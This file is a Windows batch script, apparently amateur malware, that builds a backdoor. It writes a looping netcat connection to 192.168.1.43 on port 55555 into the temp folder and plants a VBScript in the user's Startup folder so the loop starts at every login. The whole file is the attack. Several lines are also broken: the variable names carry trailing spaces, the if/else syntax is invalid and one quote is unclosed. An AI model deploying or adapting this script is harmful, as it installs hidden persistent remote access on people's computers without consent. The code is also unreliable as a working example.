@echo off
if exist %TEMP%\nc.exe set nc_exist =true
if exist %TEMP%\hackback.bat set allready_installed =true else set allready_installed =false
if %nc_exist%==true goto next else echo nc not found, exiting... && exit

:next
if %allready_installed%==true echo allready installed && timeout /t 2 > nul && exit
if %allready_installed%==false echo building... && goto build 

:build
cd %TEMP%
echo ^@echo off > hackback.bat
echo :loop >> hackback.bat
echo nc.exe 192.168.1.43 55555 >> hackback.bat
echo ^echo try ^>^> backhack.log >> hackback.bat
echo goto loop >> hackback.bat

echo ^Set ^objShell ^= CreateObject(^"Wscript^.Shell^") >> "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\backback.vbs"
echo ^objShell^.Run ^"Wscript^.exe ^%TEMP%\^hackback.bat >> "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\backback.vbs"

timeout /t 2 > nul
cls
echo done building, starting...
start "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\backback.vbs"
timeout /t 3 > nul
cls
echo done and started! exiting...
timeout /t 2 > nul
exit